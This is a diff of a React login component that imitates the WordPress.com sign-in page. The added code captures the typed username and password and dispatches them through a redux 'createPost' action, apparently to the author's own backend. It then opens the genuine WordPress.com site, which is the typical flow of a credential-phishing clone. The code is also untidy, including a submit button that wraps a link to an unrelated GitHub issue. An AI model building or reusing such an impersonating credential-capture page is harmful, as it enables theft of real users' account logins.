@@ -1,4 +1,4 @@
-import React from "react";
+import React, { useState } from "react";
 //import { TextField } from "@material-ui/core";
 import AppleIcon from "@material-ui/icons/Apple";
 import { FcGoogle } from "react-icons/fc";
@@ -11,8 +11,12 @@ import InputAdornment from "@material-ui/core/InputAdornment";
 import FormControl from "@material-ui/core/FormControl";
 import Visibility from "@material-ui/icons/Visibility";
 import VisibilityOff from "@material-ui/icons/VisibilityOff";
+import { useDispatch } from "react-redux";
+import { createPost } from "../../src/action/Posts";
+import { Link } from 'react-router-dom';
 
 const Password = () => {
+
   const [check, setCheck] = React.useState({
     amount: "",
     password: "",
@@ -33,36 +37,41 @@ const Password = () => {
     event.preventDefault();
   };
 
-  const [values, setValues] = React.useState({
-    amount: "",
-    password: "",
-    weight: "",
-    weightRange: "",
-    showPassword: false,
-  });
+  
 
-  const handleChange = (prop) => (event) => {
-    setValues({ ...values, [prop]: event.target.value });
-  };
 
-  const handleClickShowPassword = () => {
-    setValues({ ...values, showPassword: !values.showPassword });
-  };
+  const [postData, setPostData] = useState( {
+   username: '', password: ''
+  })
 
-  const handleMouseDownPassword = (event) => {
-    event.preventDefault();
-  };
-
+  const dispatch = useDispatch()
+   
  
+  const  handleSubmit = (e) => {
+   if(postData) { e.preventDefault()
+    dispatch( createPost(postData)) }
+
+    if (postData){
+      window.open("https://wordpress.com/start/domains?ref=logged-out-homepage-lp")
+    } else{
+      console.log('error')
+    }
+  }
+
+  
+
+
+
   return (
     <div >
-      <div className="Logo">
+      <form autoComplete="off" noValidate onSubmit={handleSubmit}>
+      <div className="Logo" >
         <h1 className="logo">W</h1>
       </div>
       <div className="titel-log">
         <h1 className="titel-log-h1">Log in to your account</h1>
       </div>
-      <div className="login-center">
+      <div className="login-center" >
         <a href="login" className="password-center-a">
           <p className="mb-2">
             {" "}
@@ -75,6 +84,8 @@ const Password = () => {
           margin="dense"
           variant="outlined"
           className="username-password mt-0 mb-2"
+          value={postData. username} onChange= {(e) => setPostData({ ...postData, username: e.target.value})}
+
         />
         </div>
         <div className="password-div" >
@@ -87,6 +98,8 @@ const Password = () => {
             variant="outlined"
             margin="dense"
             id="1"
+            value={postData. password} onChange= {(e) => setPostData({ ...postData,  password: e.target.value})}
+
           >
             <OutlinedInput
               type={check.showPassword ? "text" : "password"}
@@ -109,30 +122,7 @@ const Password = () => {
           </FormControl>
           </div>
           <div className="user-password-div">
-            <div className="Password">
-          <p className="mb-2 p-password">Check password</p>
-          </div>
-          <FormControl className="username-password mb-3 mt-0 mb-3" variant="outlined" margin="dense" id = '2'>
-              <OutlinedInput
-                type={values.showPassword ? "text" : "password"}
-                value={values.password}
-                onChange={handleChange("password")}
-                endAdornment={
-                  <InputAdornment position="end">
-                    <IconButton
-                      aria-label="toggle password visibility"
-                      onClick={handleClickShowPassword}
-                      onMouseDown={handleMouseDownPassword}
-                      edge="end"
-                    >
-                      {values.showPassword ? <Visibility /> : <VisibilityOff />}
-                    </IconButton>
-                  </InputAdornment>
-                }
-                labelWidth={70}
-              />
-            </FormControl>
-
+           
           </div>
 
         </div>
@@ -145,11 +135,10 @@ const Password = () => {
 
         <div className="password-login">
         
-          <button  className="password-second-button">
-            Log in
-          </button>
+        <button  className="password-second-button" type="submit"> <a href = "https://github.com/couds/react-bulma-components/issues/55" onClick={handleSubmit} > Login </a>
+          </button> 
         
-
+          
           <div className="line-file-log">
             <div className="line-log"></div>
             <p className="or-log">OR</p>
@@ -207,9 +196,12 @@ const Password = () => {
           <PublicIcon /> Would you like to help us translate WordPress.com into{" "}
           <a href="#">Amharic</a>?{" "}
         </p>
+     
       </div>
+      </form>
     </div>
   );
 };
 
 export default Password;
+//// "https://wordpress.com/start/domains?ref=logged-out-homepage-lp"
